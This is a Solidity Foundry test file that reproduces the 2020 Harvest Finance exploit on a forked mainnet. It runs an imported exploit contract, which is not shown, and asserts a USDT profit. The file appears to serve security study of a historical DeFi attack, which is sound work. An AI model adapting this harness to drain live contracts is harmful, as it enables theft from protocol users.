// SPDX-License-Identifier:MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {HarvestFinanceExploit} from "../../src/HarvestFinance/HarvestFinanceExploit.sol";
import "../../src/HarvestFinance/Interfaces.sol";

// Reproducing Famous harvest finance exploit from 2020
// https://tx.eth.samczsun.com/ethereum/0x35f8d2f572fceaac9288e5d462117850ef2694786992a8c3f6d02612277b0877

contract HarvestFinanceHackTest is Test {
    HarvestFinanceExploit hfExploit;
    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    function setUp() public {
        string memory url = vm.rpcUrl("mainnet");
        vm.createSelectFork(url, 11129473);
        hfExploit = new HarvestFinanceExploit();
        vm.label(address(hfExploit), "exploitContract");
    }

    function testHVExploit() public {
        hfExploit.exploit();
        console.log("Profit", usdt.balanceOf(address(this)) / 1e6);
        assert(usdt.balanceOf(address(this)) > 0);
    }
}
